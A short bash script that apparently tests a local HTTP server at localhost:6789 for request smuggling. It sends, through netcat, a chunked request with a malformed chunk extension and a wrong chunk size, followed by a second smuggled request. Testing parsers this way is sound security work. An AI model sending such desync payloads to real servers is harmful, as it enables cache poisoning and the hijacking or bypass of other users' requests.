#!/bin/bash

(printf 'GET http://localhost:6789/testeget HTTP/1.1\r\n'\
'Transfer-Encoding: chunked\r\n'\
'Host: localhost\r\n\r\n'\
"2;\nxx\r\n"\
'47\r\n'\
'0\r\n'\
'\r\n'\
'GET http://localhost:6789/testeget HTTP/1.1\r\n'\
'Transfer-Encoding: chunked\r\n'\
'Host: localhost\r\n\r\n'\
'0\r\n'\
'\r\n'; sleep 1) | nc localhost 6789